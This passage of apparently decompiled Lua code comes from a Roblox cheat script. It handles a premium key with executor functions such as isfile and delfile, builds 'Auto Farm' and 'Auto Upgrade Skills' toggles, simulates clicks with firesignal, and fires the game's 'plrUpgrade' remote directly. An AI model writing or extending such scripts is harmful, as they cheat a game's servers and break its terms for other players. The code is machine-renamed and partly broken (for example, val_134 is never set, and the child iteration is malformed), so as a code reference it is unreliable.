                local key_file_5
                local local_1_result_4 = val_115
                if local_1_result_4 then
                    local_1_result_4 = isfile
                    key_file_5 = val_115
                    if key_file_5 ~= nil then
                        key_file_5 = key_file_5.KEY_FILE
                    else
                        key_file_5 = nil
                    end
                    local_1_result_4 = local_1_result_4(key_file_5)
                    if local_1_result_4 then
                        local_1_result_4 = delfile
                        key_file_5 = val_115
                        if key_file_5 ~= nil then
                            key_file_5 = key_file_5.KEY_FILE
                        else
                            key_file_5 = nil
                        end
                        local_1_result_4(key_file_5)
                    end
                end
                return
            end)
            pcall_7 = pcall
            local capture_44_1537_2 = val_112
            pcall_7(function()
                local set = capture_44_1537_2.value
                local val_116 = set
                if set then
                    set = set.Set
                else
                    set = nil
                end
                set(val_116, "")
                return
            end)
            capture_1_117763.value = false
            pcall_7 = val_113
            local pack_result_18 = pcall_7
            if pcall_7 then
                pcall_7 = pcall_7.SetPremium
            else
                pcall_7 = nil
            end
            pcall_7(pack_result_18, false)
            pcall_7 = capture_1_117765.value
            local pack_result_19 = pack(val_114("Key Deactivated"))
            if pack_result_19.n >= 1 then
                pack_result_18 = pack_result_19[1]
            end
            if pack_result_19.n >= 2 then
                pack_result_15 = pack_result_19[2]
            end
            if pack_result_19.n >= 3 then
                pack_result_16 = pack_result_19[3]
            end
            if pack_result_19.n >= 4 then
                pack_result_17 = pack_result_19[4]
            end
            pcall_7(unpack(pack_result_19, 1, pack_result_19.n))
            pcall_7 = val_113
            pack_result_18 = pcall_7
            if pcall_7 then
                pcall_7 = pcall_7.MakeNotification
            else
                pcall_7 = nil
            end
            pack_result_15 = {}
            pack_result_15.Name = val_114("Deactivated")
            pack_result_15.Content = val_114("Premium deactivated and key cleared")
            pack_result_15.Time = 2.0
            pcall_7(pack_result_18, pack_result_15)
            return
        end
    end
    if tbl_31.value then
        tbl_31.value.Callback = tbl_32.value
    end
    tbl_29.value(tbl_30.value, tbl_31.value)
    tbl_29.value = task
    if tbl_29.value ~= nil then
        tbl_29.value = tbl_29.value.spawn
    else
        tbl_29.value = nil
    end
    do
        local val_117, val_118, capture_1_120579, val_119, capture_1_120581, capture_1_120582, val_120, capture_1_120584 = spawn_2, handler_3, tbl_22, handler, tbl_23, tbl_27, sphub_first_time_path, tbl_21
        tbl_30.value = function()
            local pack_result_20
            local val_121, local_4_result_3, lifetime_2, set_premium, string_2, value_10, text_7, invalid_2, invalid_key_2
            local wait_2 = task.wait
            local saved_key = 1.0
            wait_2(saved_key)
            wait_2 = val_117
            if wait_2 then
                wait_2 = val_117
                if wait_2 ~= nil then
                    wait_2 = wait_2.savedKey
                else
                    wait_2 = nil
                end
                if wait_2 ~= "" then
                    wait_2 = val_118
                    saved_key = val_117
                    if saved_key ~= nil then
                        saved_key = saved_key.savedKey
                    else
                        saved_key = nil
                    end
                    wait_2 = wait_2(saved_key)
                    if wait_2 then
                        if saved_key then
                            local_4_result_3 = saved_key
                        else
                            local_4_result_3 = val_119
                            lifetime_2 = "Lifetime"
                            local_4_result_3 = local_4_result_3(lifetime_2)
                        end
                        capture_1_120579.value = local_4_result_3
                        if val_121 then
                            local_4_result_3 = val_121
                        else
                            local_4_result_3 = os
                            if local_4_result_3 ~= nil then
                                local_4_result_3 = local_4_result_3.time
                            else
                                local_4_result_3 = nil
                            end
                            local_4_result_3 = (local_4_result_3()) + (315360000.0)
                        end
                        capture_1_120581.value = local_4_result_3
                        local_4_result_3 = capture_1_120582.value
                        pack_result_20 = pack(val_119("\226\156\133 Auto Login"))
                        if pack_result_20.n >= 1 then
                            lifetime_2 = pack_result_20[1]
                        end
                        if pack_result_20.n >= 2 then
                            set_premium = pack_result_20[2]
                        end
                        if pack_result_20.n >= 3 then
                            string_2 = pack_result_20[3]
                        end
                        if pack_result_20.n >= 4 then
                            value_10 = pack_result_20[4]
                        end
                        if pack_result_20.n >= 5 then
                            text_7 = pack_result_20[5]
                        end
                        if pack_result_20.n >= 6 then
                            invalid_2 = pack_result_20[6]
                        end
                        if pack_result_20.n >= 7 then
                            invalid_key_2 = pack_result_20[7]
                        end
                        local_4_result_3(unpack(pack_result_20, 1, pack_result_20.n))
                        local_4_result_3 = val_120
                        lifetime_2 = local_4_result_3
                        if local_4_result_3 then
                            local_4_result_3 = local_4_result_3.SetPremium
                        else
                            local_4_result_3 = nil
                        end
                        set_premium = true
                        local_4_result_3(lifetime_2, set_premium)
                        local_4_result_3 = true
                        capture_1_120584.value = local_4_result_3
                    else
                        local_4_result_3 = saved_key
                        lifetime_2 = val_121
                        capture_1_120584.value = false
                        set_premium = val_120
                        string_2 = set_premium
                        if set_premium then
                            set_premium = set_premium.SetPremium
                        else
                            set_premium = nil
                        end
                        set_premium(string_2, false)
                        set_premium = pcall
                        local val_122 = val_117
                        set_premium(function()
                            local key_file_6
                            local val_123 = val_122
                            if val_123 then
                                val_123 = delfile
                                key_file_6 = val_122
                                if key_file_6 ~= nil then
                                    key_file_6 = key_file_6.KEY_FILE
                                else
                                    key_file_6 = nil
                                end
                                val_123(key_file_6)
                            end
                            return
                        end)
                        set_premium = capture_1_120582.value
                        string_2 = string
                        if string_2 ~= nil then
                            string_2 = string_2.format
                        else
                            string_2 = nil
                        end
                        value_10 = "Saved Key Invalid (Reason: %s | Error: %s)"
                        text_7 = tostring
                        if local_4_result_3 then
                            invalid_2 = local_4_result_3
                        else
                            invalid_2 = "Invalid"
                        end
                        text_7 = text_7(invalid_2)
                        invalid_2 = tostring
                        if lifetime_2 then
                            invalid_key_2 = lifetime_2
                        else
                            invalid_key_2 = "Invalid Key"
                        end
                        pack_result_20 = pack(invalid_2(invalid_key_2))
                        if pack_result_20.n >= 1 then
                            invalid_2 = pack_result_20[1]
                        end
                        if pack_result_20.n >= 2 then
                            invalid_key_2 = pack_result_20[2]
                        end
                        pack_result_20 = pack(string_2(value_10, text_7, unpack(pack_result_20, 1, pack_result_20.n)))
                        if pack_result_20.n >= 1 then
                            string_2 = pack_result_20[1]
                        end
                        if pack_result_20.n >= 2 then
                            value_10 = pack_result_20[2]
                        end
                        if pack_result_20.n >= 3 then
                            text_7 = pack_result_20[3]
                        end
                        if pack_result_20.n >= 4 then
                            invalid_2 = pack_result_20[4]
                        end
                        if pack_result_20.n >= 5 then
                            invalid_key_2 = pack_result_20[5]
                        end
                        set_premium(unpack(pack_result_20, 1, pack_result_20.n))
                    end
                end
            end
            return
        end
    end
    tbl_29.value(tbl_30.value)
    tbl_29.value = task
    if tbl_29.value ~= nil then
        tbl_29.value = tbl_29.value.spawn
    else
        tbl_29.value = nil
    end
    do
        local capture_1_123649, capture_1_123650, capture_1_123651, val_124, val_125, capture_1_123654, val_126 = tbl_21, tbl_24, tbl_23, info, handler, tbl_22, handler_result
        tbl_30.value = function()
            local wait_3, os_2, val_127, val_125_result, val_125_result_2, val_125_result_3, val_128, val_125_result_4, local_13_result, val_129
            while true do
                wait_3 = task.wait
                os_2 = 1.0
                wait_3 = wait_3(os_2)
                if wait_3 then
                    wait_3 = capture_1_123649.value
                    if wait_3 then
                        wait_3 = capture_1_123650.value
                        if not wait_3 then
                            wait_3 = capture_1_123651.value
                            os_2 = os
                            if os_2 ~= nil then
                                os_2 = os_2.time
                            else
                                os_2 = nil
                            end
                            os_2 = os_2()
                            wait_3 = (wait_3) - (os_2)
                            os_2 = val_124
                            val_127 = os_2
                            if os_2 then
                                os_2 = os_2.Set
                            else
                                os_2 = nil
                            end
                            val_125_result = val_125("Status")
                            val_125_result_2 = val_125("Key Active")
                            val_125_result_3 = val_125("Expires")
                            val_128 = capture_1_123654.value
                            val_125_result_4 = val_125("Time Left")
                            local_13_result = val_126
                            val_129 = wait_3
                            local_13_result = local_13_result(val_129)
                            val_125_result_2 = concatenate({
                                val_125_result_2,
                                "\n",
                                val_125_result_3,
                                ": ",
                                val_128,
                                "\n",
                                val_125_result_4,
                                ": ",
                                local_13_result,
                            })
                            os_2(val_127, val_125_result, val_125_result_2)
                        end
                    end
                else
                    break
                end
            end
            return
        end
    end
    tbl_29.value(tbl_30.value)
    tbl_21 = {
        value = tbl_21.value,
    }
    tbl_22 = {
        value = tbl_22.value,
    }
    tbl_23 = {
        value = tbl_23.value,
    }
    tbl_24 = {
        value = tbl_24.value,
    }
    tbl_25 = {
        value = tbl_25.value,
    }
    tbl_26 = {
        value = tbl_26.value,
    }
    tbl_27 = {
        value = tbl_27.value,
    }
    tbl_28 = {
        value = tbl_28.value,
    }
    tbl_29 = {
        value = tbl_29.value,
    }
    tbl_30 = {
        value = tbl_30.value,
    }
    tbl_31 = {
        value = tbl_31.value,
    }
    tbl_32 = {
        value = tbl_32.value,
    }
    tbl_33 = {
        value = tbl_33.value,
    }
    tbl_34 = {
        value = tbl_34.value,
    }
    tbl_35 = {
        value = tbl_35.value,
    }
    tbl_36 = {
        value = tbl_36.value,
    }
    tbl_21.value = make_window
    if make_window then
        handler_12 = make_window.MakeTab
    else
        handler_12 = nil
    end
    tbl_22.value = {}
    tbl_23.value = handler
    tbl_24.value = "In Game"
    tbl_23.value = tbl_23.value(tbl_24.value)
    if tbl_22.value then
        tbl_22.value.Name = tbl_23.value
    end
    tbl_23.value = "rbxassetid://10734975692"
    if tbl_22.value then
        tbl_22.value.Icon = tbl_23.value
    end
    handler_12 = handler_12(tbl_21.value, tbl_22.value)
    tbl_22.value = handler_12
    if handler_12 then
        tbl_21.value = handler_12.AddSection
    else
        tbl_21.value = nil
    end
    tbl_23.value = {}
    tbl_24.value = handler
    tbl_25.value = "Combat"
    tbl_24.value = tbl_24.value(tbl_25.value)
    if tbl_23.value then
        tbl_23.value.Name = tbl_24.value
    end
    tbl_21.value(tbl_22.value, tbl_23.value)
    tbl_22.value = handler_12
    if handler_12 then
        tbl_21.value = handler_12.AddParagraph
    else
        tbl_21.value = nil
    end
    tbl_23.value = {}
    tbl_24.value = "Title"
    tbl_25.value = handler
    tbl_25.value = tbl_25.value("Game Info")
    if tbl_23.value then
        tbl_23.value[tbl_24.value] = tbl_25.value
    end
    tbl_24.value = "Content"
    tbl_25.value = handler
    tbl_25.value = tbl_25.value("Loading...")
    if tbl_23.value then
        tbl_23.value[tbl_24.value] = tbl_25.value
    end
    tbl_21.value = tbl_21.value(tbl_22.value, tbl_23.value)
    tbl_22.value = function()
        local pack_result_21, pack_result_22, pack_result_23, pack_result_24
        local value_11 = 0.0
        local pack_result_25 = nil
        local pairs_6 = pairs
        local workspace_3 = workspace
        local pack_result_26 = workspace_3
        workspace_3 = workspace_3.GetChildren
        local pack_result_27 = pack(workspace_3(pack_result_26))
        if pack_result_27.n >= 1 then
            workspace_3 = pack_result_27[1]
        end
        if pack_result_27.n >= 2 then
            pack_result_26 = pack_result_27[2]
        end
        if pack_result_27.n >= 3 then
            pack_result_21 = pack_result_27[3]
        end
        if pack_result_27.n >= 4 then
            pack_result_22 = pack_result_27[4]
        end
        if pack_result_27.n >= 5 then
            pack_result_23 = pack_result_27[5]
        end
        if pack_result_27.n >= 6 then
            pack_result_24 = pack_result_27[6]
        end
        pairs_6 = pairs_6(unpack(pack_result_27, 1, pack_result_27.n))
        while true do
            pack_result_21 = pairs_6(workspace_3, pack_result_26)
            if pack_result_21 ~= nil then
                pack_result_26 = pack_result_21
                pack_result_23 = tonumber
                if pack_result_22 ~= nil then
                    pack_result_24 = pack_result_22.Name
                else
                    pack_result_24 = nil
                end
                pack_result_23 = pack_result_23(pack_result_24)
                if pack_result_23 then
                    if (value_11 < pack_result_23) then
                        value_11 = pack_result_23
                        pack_result_25 = pack_result_22
                    end
                end
            else
                break
            end
        end
        pairs_6 = pack_result_25
        if (0.0 < value_11) then
            if value_11 then
                workspace_3 = value_11
            else
                workspace_3 = nil
            end
        else
            workspace_3 = nil
        end
        return pairs_6, workspace_3
    end
    tbl_23.value = function(argument_1)
        local get_extents_size, math_5, x, z
        if not argument_1 then
            get_extents_size = 100.0
            return get_extents_size
        else
            math_5 = argument_1
            if argument_1 then
                get_extents_size = argument_1.GetExtentsSize
            else
                get_extents_size = nil
            end
            get_extents_size = get_extents_size(math_5)
            math_5 = math
            if math_5 ~= nil then
                math_5 = math_5.max
            else
                math_5 = nil
            end
            if get_extents_size ~= nil then
                x = get_extents_size.X
            else
                x = nil
            end
            if get_extents_size ~= nil then
                z = get_extents_size.Z
            else
                z = nil
            end
            return math_5(x, z)
        end
    end
    tbl_24.value = task
    if tbl_24.value ~= nil then
        tbl_24.value = tbl_24.value.spawn
    else
        tbl_24.value = nil
    end
    do
        local capture_1_134657, val_130, val_131, capture_1_134660, val_132, capture_1_134662 = tbl_22, pcall_2, handler, tbl_23, handler_5, tbl_21
        tbl_25.value = function()
            local val_133, val_134, val_130_result, concatenate_result, local_5_result_2, val_132_result, val_131_result, val_130_result_2, val_131_result_2, val_135, val_131_result_3, val_136
            while true do
                (task.wait)(0.1)
                val_133 = (capture_1_134657.value)()
                val_130_result = val_130()
                concatenate_result = nil
                if val_134 then
                    if not val_130_result then
                        local_5_result_2 = val_131
                        val_132_result = "There is no game, you are in the lobby"
                        local_5_result_2 = local_5_result_2(val_132_result)
                        concatenate_result = local_5_result_2
                    else
                        local_5_result_2 = (capture_1_134660.value)(val_133)
                        val_132_result = val_132(local_5_result_2)
                        val_131_result = val_131("World")
                        val_130_result_2 = val_130_result
                        val_131_result_2 = val_131("Stage")
                        val_135 = val_134
                        val_131_result_3 = val_131("Enemies")
                        val_136 = #(val_132_result)
                        concatenate_result = concatenate({
                            val_131_result,
                            ": ",
                            val_130_result_2,
                            "\n",
                            val_131_result_2,
                            ": ",
                            val_135,
                            "\n",
                            val_131_result_3,
                            ": ",
                            val_136,
                        })
                    end
                else
                    local_5_result_2 = val_131
                    val_132_result = "There is no game, you are in the lobby"
                    local_5_result_2 = local_5_result_2(val_132_result)
                    concatenate_result = local_5_result_2
                end
                local_5_result_2 = capture_1_134662.value
                val_132_result = local_5_result_2
                if local_5_result_2 then
                    local_5_result_2 = local_5_result_2.Set
                else
                    local_5_result_2 = nil
                end
                val_131_result = concatenate_result
                local_5_result_2(val_132_result, val_131_result)
            end
        end
    end
    tbl_24.value(tbl_25.value)
    make_tab = "AddToggle"
    tbl_25.value = handler_12
    if handler_12 then
        tbl_24.value = handler_12[make_tab]
    else
        tbl_24.value = nil
    end
    make_tab = {}
    make_tab.Name = handler("Auto Farm")
    make_tab_2 = false
    make_tab.Default = make_tab_2
    make_tab.Flag = "AutoFarm"
    do
        local val_137 = tbl_3
        make_tab_2 = function(argument_1)
            local val_138 = val_137
            if val_138 then
                val_138.AutoFarm = argument_1
            end
            return
        end
    end
    make_tab.Callback = make_tab_2
    tbl_24.value(tbl_25.value, make_tab)
    make_tab = "AddToggle"
    tbl_25.value = handler_12
    if handler_12 then
        tbl_24.value = handler_12[make_tab]
    else
        tbl_24.value = nil
    end
    make_tab = {}
    make_tab.Name = handler("Auto Upgrade Skills")
    make_tab.Desc = handler("Automatically upgrades skills to MAX level when the selection menu appears upon leveling up (Premium Only).")
    make_tab.PremiumOnly = false
    make_tab_2 = false
    make_tab.Default = make_tab_2
    make_tab.Flag = "AutoUpgradeSkills"
    do
        local val_139 = tbl_3
        make_tab_2 = function(argument_1)
            local val_140 = val_139
            if val_140 then
                val_140.AutoUpgradeSkills = argument_1
            end
            return
        end
    end
    make_tab.Callback = make_tab_2
    tbl_24.value(tbl_25.value, make_tab)
    tbl_24.value = false
    tbl_25.value = task
    if tbl_25.value ~= nil then
        tbl_25.value = tbl_25.value.spawn
    else
        tbl_25.value = nil
    end
    do
        local val_141, capture_1_146434 = tbl_3, tbl_24
        make_tab = function()
            local wait_4, handler_20
            while true do
                wait_4 = task.wait
                handler_20 = 0.5
                wait_4(handler_20)
                wait_4 = val_141
                if wait_4 ~= nil then
                    wait_4 = wait_4.AutoUpgradeSkills
                else
                    wait_4 = nil
                end
                if wait_4 then
                    wait_4 = capture_1_146434.value
                    if not wait_4 then
                        wait_4 = pcall
                        local capture_55_3329_2 = capture_1_146434
                        handler_20 = function()
                            local pack_result_28
                            local visible, choice, card, level_up, level_up_2, cards, skills, skill_select, skill_selection, card_select, card_selection, upgrade_select, upgrade_select_2, level_upgrade, choice_2, level_up_card
                            local tbl_50 = {}
                            local tbl_51 = {}
                            local player_gui = plr
                            if player_gui ~= nil then
                                player_gui = player_gui.PlayerGui
                            else
                                player_gui = nil
                            end
                            tbl_50.value = player_gui
                            if player_gui then
                                player_gui = player_gui.FindFirstChild
                            else
                                player_gui = nil
                            end
                            local game_ui = "gameUI"
                            player_gui = player_gui(tbl_50.value, game_ui)
                            tbl_50.value = nil
                            if not player_gui then
                                game_ui = player_gui
                            else
                                visible = player_gui
                                if player_gui then
                                    game_ui = player_gui.FindFirstChild
                                else
                                    game_ui = nil
                                end
                                tbl_51.value = "upgradeFrame"
                                game_ui = game_ui(visible, tbl_51.value)
                            end
                            if game_ui then
                                if game_ui ~= nil then
                                    visible = game_ui.Visible
                                else
                                    visible = nil
                                end
                                if visible then
                                    if game_ui ~= nil then
                                        visible = game_ui.Position
                                    else
                                        visible = nil
                                    end
                                    if visible ~= nil then
                                        visible = visible.Y
                                    else
                                        visible = nil
                                    end
                                    if visible ~= nil then
                                        visible = visible.Scale
                                    else
                                        visible = nil
                                    end
                                    if (-0.5 < visible) then
                                        tbl_50.value = game_ui
                                    end
                                end
                            end
                            if not tbl_50.value then
                                visible = {}
                                tbl_51.value = "cardChoice"
                                choice = "choice"
                                card = "card"
                                level_up = "LevelUp"
                                level_up_2 = "levelUp"
                                cards = "cards"
                                skills = "skills"
                                skill_select = "skillSelect"
                                skill_selection = "SkillSelection"
                                card_select = "CardSelect"
                                card_selection = "CardSelection"
                                upgrade_select = "upgradeSelect"
                                upgrade_select_2 = "UpgradeSelect"
                                level_upgrade = "levelUpgrade"
                                choice_2 = "Choice"
                                level_up_card = "LevelUpCard"
                                visible[1] = tbl_51.value
                                visible[2] = choice
                                visible[3] = card
                                visible[4] = level_up
                                visible[5] = level_up_2
                                visible[6] = cards
                                visible[7] = skills
                                visible[8] = skill_select
                                visible[9] = skill_selection
                                visible[10] = card_select
                                visible[11] = card_selection
                                visible[12] = upgrade_select
                                visible[13] = upgrade_select_2
                                visible[14] = level_upgrade
                                visible[15] = choice_2
                                visible[16] = level_up_card
                                local val_142, capture_56_11010_2 = visible, tbl_50
                                tbl_51.value = function(argument_1)
                                    local ipairs_2, val_143, ipairs_2_result, ipairs_2_result_2, val_144, find_first_child_9, visible_2, val_145
                                    if not argument_1 then
                                        return
                                    else
                                        ipairs_2 = ipairs
                                        val_143 = val_142
                                        ipairs_2 = ipairs_2(val_143)
                                        while true do
                                            ipairs_2_result_2 = ipairs_2(val_143, ipairs_2_result)
                                            if ipairs_2_result_2 ~= nil then
                                                ipairs_2_result = ipairs_2_result_2
                                                visible_2 = argument_1
                                                if argument_1 then
                                                    find_first_child_9 = argument_1.FindFirstChild
                                                else
                                                    find_first_child_9 = nil
                                                end
                                                val_145 = val_144
                                                find_first_child_9 = find_first_child_9(visible_2, val_145)
                                                if find_first_child_9 then
                                                    if find_first_child_9 ~= nil then
                                                        visible_2 = find_first_child_9.Visible
                                                    else
                                                        visible_2 = nil
                                                    end
                                                    if not visible_2 then
                                                        val_145 = find_first_child_9
                                                        if find_first_child_9 then
                                                            visible_2 = find_first_child_9.IsA
                                                        else
                                                            visible_2 = nil
                                                        end
                                                        visible_2 = visible_2(val_145, "GuiObject")
                                                        if visible_2 then
                                                            if find_first_child_9 ~= nil then
                                                                visible_2 = find_first_child_9.AbsoluteSize
                                                            else
                                                                visible_2 = nil
                                                            end
                                                            if visible_2 ~= nil then
                                                                visible_2 = visible_2.Y
                                                            else
                                                                visible_2 = nil
                                                            end
                                                            if (0.0 < visible_2) then
                                                                capture_56_11010_2.value = find_first_child_9
                                                                break
                                                            end
                                                        end
                                                    else
                                                        capture_56_11010_2.value = find_first_child_9
                                                        break
                                                    end
                                                end
                                            else
                                                break
                                            end
                                        end
                                        return
                                    end
                                end
                                if player_gui then
                                    choice = tbl_51.value
                                    card = player_gui
                                    choice(card)
                                    if not tbl_50.value then
                                        choice = tbl_51.value
                                        level_up = player_gui
                                        if player_gui then
                                            card = player_gui.FindFirstChild
                                        else
                                            card = nil
                                        end
                                        level_up_2 = "HUD"
                                        pack_result_28 = pack(card(level_up, level_up_2))
                                        if pack_result_28.n >= 1 then
                                            card = pack_result_28[1]
                                        end
                                        if pack_result_28.n >= 2 then
                                            level_up = pack_result_28[2]
                                        end
                                        if pack_result_28.n >= 3 then
                                            level_up_2 = pack_result_28[3]
                                        end
                                        if pack_result_28.n >= 4 then
                                            cards = pack_result_28[4]
                                        end
                                        if pack_result_28.n >= 5 then
                                            skills = pack_result_28[5]
                                        end
                                        if pack_result_28.n >= 6 then
                                            skill_select = pack_result_28[6]
                                        end
                                        if pack_result_28.n >= 7 then
                                            skill_selection = pack_result_28[7]
                                        end
                                        if pack_result_28.n >= 8 then
                                            card_select = pack_result_28[8]
                                        end
                                        if pack_result_28.n >= 9 then
                                            card_selection = pack_result_28[9]
                                        end
                                        if pack_result_28.n >= 10 then
                                            upgrade_select = pack_result_28[10]
                                        end
                                        if pack_result_28.n >= 11 then
                                            upgrade_select_2 = pack_result_28[11]
                                        end
                                        if pack_result_28.n >= 12 then
                                            level_upgrade = pack_result_28[12]
                                        end
                                        if pack_result_28.n >= 13 then
                                            choice_2 = pack_result_28[13]
                                        end
                                        if pack_result_28.n >= 14 then
                                            level_up_card = pack_result_28[14]
                                        end
                                        choice(unpack(pack_result_28, 1, pack_result_28.n))
                                    end
                                end
                                if not tbl_50.value then
                                    choice = tbl_51.value
                                    card = plr
                                    if card ~= nil then
                                        card = card.PlayerGui
                                    else
                                        card = nil
                                    end
                                    choice(card)
                                end
                                tbl_51 = {
                                    value = tbl_51.value,
                                }
                            end
                            if tbl_50.value then
                                capture_55_3329_2.value = true
                                visible = math
                                if visible ~= nil then
                                    visible = visible.random
                                else
                                    visible = nil
                                end
                                tbl_51.value = 1.0
                                choice = 3.0
                                visible = visible(tbl_51.value, choice)
                                tbl_51.value = false
                                if tbl_50.value ~= nil then
                                    choice = tbl_50.value.Name
                                else
                                    choice = nil
                                end
                                if (choice == "upgradeFrame") then
                                    choice = {}
                                    level_up = tbl_50.value
                                    if tbl_50.value then
                                        card = tbl_50.value.FindFirstChild
                                    else
                                        card = nil
                                    end
                                    level_up_2 = "LeftBanner"
                                    card = card(level_up, level_up_2)
                                    if card then
                                        if tbl_50.value ~= nil then
                                            card = tbl_50.value.LeftBanner
                                        else
                                            card = nil
                                        end
                                        level_up = card
                                        if card then
                                            card = card.FindFirstChild
                                        else
                                            card = nil
                                        end
                                        level_up_2 = "BannerCover"
                                        card = card(level_up, level_up_2)
                                    end
                                    level_up_2 = tbl_50.value
                                    if tbl_50.value then
                                        level_up = tbl_50.value.FindFirstChild
                                    else
                                        level_up = nil
                                    end
                                    cards = "MiddleBanner"
                                    level_up = level_up(level_up_2, cards)
                                    if level_up then
                                        if tbl_50.value ~= nil then
                                            level_up = tbl_50.value.MiddleBanner
                                        else
                                            level_up = nil
                                        end
                                        level_up_2 = level_up
                                        if level_up then
                                            level_up = level_up.FindFirstChild
                                        else
                                            level_up = nil
                                        end
                                        cards = "BannerCover"
                                        level_up = level_up(level_up_2, cards)
                                    end
                                    cards = tbl_50.value
                                    if tbl_50.value then
                                        level_up_2 = tbl_50.value.FindFirstChild
                                    else
                                        level_up_2 = nil
                                    end
                                    skills = "RightBanner"
                                    level_up_2 = level_up_2(cards, skills)
                                    if level_up_2 then
                                        if tbl_50.value ~= nil then
                                            level_up_2 = tbl_50.value.RightBanner
                                        else
                                            level_up_2 = nil
                                        end
                                        cards = level_up_2
                                        if level_up_2 then
                                            level_up_2 = level_up_2.FindFirstChild
                                        else
                                            level_up_2 = nil
                                        end
                                        skills = "BannerCover"
                                        level_up_2 = level_up_2(cards, skills)
                                    end
                                    choice[1] = card
                                    choice[2] = level_up
                                    choice[3] = level_up_2
                                    if choice ~= nil then
                                        card = choice[visible]
                                    else
                                        card = nil
                                    end
                                    if card then
                                        level_up = pcall
                                        local val_146, capture_56_28418_2 = card, tbl_51
                                        level_up_2 = function()
                                            local mouse_button1_click
                                            local val_147 = firesignal
                                            if val_147 then
                                                val_147 = firesignal
                                                mouse_button1_click = val_146
                                                if mouse_button1_click ~= nil then
                                                    mouse_button1_click = mouse_button1_click.MouseButton1Click
                                                else
                                                    mouse_button1_click = nil
                                                end
                                                val_147(mouse_button1_click)
                                                val_147 = firesignal
                                                mouse_button1_click = val_146
                                                if mouse_button1_click ~= nil then
                                                    mouse_button1_click = mouse_button1_click.Activated
                                                else
                                                    mouse_button1_click = nil
                                                end
                                                val_147(mouse_button1_click)
                                                val_147 = true
                                                capture_56_28418_2.value = val_147
                                            end
                                            return
                                        end
                                        level_up(level_up_2)
                                    end
                                end
                                if not tbl_51.value then
                                    choice = ReplicatedStorage
                                    card = choice
                                    if choice then
                                        choice = choice.WaitForChild
                                    else
                                        choice = nil
                                    end
                                    level_up = "remotes"
                                    choice = choice(card, level_up)
                                    if not choice then
                                        card = choice
                                    else
                                        level_up = choice
                                        if choice then
                                            card = choice.FindFirstChild
                                        else
                                            card = nil
                                        end
                                        level_up_2 = "plrUpgrade"
                                        card = card(level_up, level_up_2)
                                    end
                                    if card then
                                        level_up = pcall
                                        local val_148, val_149 = card, visible
                                        level_up_2 = function()
                                            local fire_server_8 = val_148
                                            local val_150 = fire_server_8
                                            if fire_server_8 then
                                                fire_server_8 = fire_server_8.FireServer
                                            else
                                                fire_server_8 = nil
                                            end
                                            fire_server_8(val_150, val_149)
                                            return
                                        end
                                        level_up(level_up_2)
                                    end
                                    level_up = pcall
                                    local capture_56_35329_2 = tbl_50
                                    level_up_2 = function()
                                        local new_2, value_12, val_151
                                        local tbl_value = capture_56_35329_2.value
                                        if tbl_value ~= nil then
                                            tbl_value = tbl_value.Name
                                        else
                                            tbl_value = nil
                                        end
                                        if (tbl_value == "upgradeFrame") then
                                            tbl_value = capture_56_35329_2.value
                                            new_2 = UDim2.new
                                            value_12 = 0.0
                                            val_151 = -1.0
                                            new_2 = new_2(value_12, 0.0, val_151, 0.0)
                                            if tbl_value then
                                                tbl_value.Position = new_2
                                            end
                                            tbl_value = game
                                            new_2 = tbl_value
                                            tbl_value = (tbl_value.GetService)(new_2, "Lighting")
                                            value_12 = tbl_value
                                            if tbl_value then
                                                new_2 = tbl_value.FindFirstChild
                                            else
                                                new_2 = nil
                                            end
                                            new_2 = new_2(value_12, "deathBlur")
                                            if new_2 then
                                                if tbl_value ~= nil then
                                                    new_2 = tbl_value.deathBlur
                                                else
                                                    new_2 = nil
                                                end
                                                if new_2 then
                                                    new_2.Size = 0.0
                                                end
                                            end
                                        else
                                            tbl_value = capture_56_35329_2.value
                                            if tbl_value then
                                                tbl_value.Visible = false
                                            end
                                        end
                                        return
                                    end
                                    level_up(level_up_2)
                                end
                                choice = task.spawn
                                local capture_56_36865_2, capture_56_36866_2 = tbl_50, capture_55_3329_2
                                card = function()
                                    local parent, name, value_13
                                    while true do
                                        parent = capture_56_36865_2.value
                                        if parent then
                                            parent = capture_56_36865_2.value
                                            if parent ~= nil then
                                                parent = parent.Parent
                                            else
                                                parent = nil
                                            end
                                            if parent then
                                                parent = false
                                                name = capture_56_36865_2.value
                                                if name ~= nil then
                                                    name = name.Name
                                                else
                                                    name = nil
                                                end
                                                if (name == "upgradeFrame") then
                                                    name = capture_56_36865_2.value
                                                    if name ~= nil then
                                                        name = name.Visible
                                                    else
                                                        name = nil
                                                    end
                                                    if not name then
                                                        parent = name
                                                    else
                                                        name = capture_56_36865_2.value
                                                        if name ~= nil then
                                                            name = name.Position
                                                        else
                                                            name = nil
                                                        end
                                                        if name ~= nil then
                                                            name = name.Y
                                                        else
                                                            name = nil
                                                        end
                                                        if name ~= nil then
                                                            name = name.Scale
                                                        else
                                                            name = nil
                                                        end
                                                        if -0.5 >= name then
                                                            parent = false
                                                        else
                                                            parent = true
                                                        end
                                                    end
                                                else
                                                    name = capture_56_36865_2.value
                                                    if name ~= nil then
                                                        name = name.Visible
                                                    else
                                                        name = nil
                                                    end
                                                    if name then
                                                        parent = name
                                                    else
                                                        name = capture_56_36865_2.value
                                                        value_13 = name
                                                        if name then
                                                            name = name.IsA
                                                        else
                                                            name = nil
                                                        end
                                                        name = name(value_13, "GuiObject")
                                                        if not name then
                                                            parent = name
                                                        else
                                                            name = capture_56_36865_2.value
                                                            if name ~= nil then
                                                                name = name.AbsoluteSize
                                                            else
                                                                name = nil
                                                            end
                                                            if name ~= nil then
                                                                name = name.Y
                                                            else
                                                                name = nil
                                                            end
                                                            if 0.0 >= name then
                                                                parent = false
                                                            else
                                                                parent = true
                                                            end
                                                        end
                                                    end
                                                end
                                                if not parent then
                                                    break
                                                else
                                                    name = task.wait
                                                    value_13 = 0.2
                                                    name(value_13)
                                                end
                                            else
                                                break
                                            end
                                        else
                                            break
                                        end
                                    end
                                    capture_56_36866_2.value = false
                                    return
                                end
                                choice(card)
                                tbl_51 = {
                                    value = tbl_51.value,
                                }
                            end
                            return
                        end
                        wait_4(handler_20)
                    end
                end
            end
        end
    end
    tbl_25.value(make_tab)
    tbl_25.value = task
    if tbl_25.value ~= nil then
        tbl_25.value = tbl_25.value.spawn
    else
        tbl_25.value = nil
    end
    do
        local val_152, val_153, val_154, val_155 = tbl_3, tbl_9, tbl_11, tbl_12
        make_tab = function()
            local wait_5, handler_21
            while true do
                wait_5 = task.wait
                handler_21 = 0.05
                wait_5(handler_21)
                wait_5 = val_152
                if wait_5 ~= nil then
                    wait_5 = wait_5.AutoFarm
                else
                    wait_5 = nil
                end
                if wait_5 then
                    wait_5 = vaultTarget
                    if wait_5 then
                        wait_5 = vaultTarget
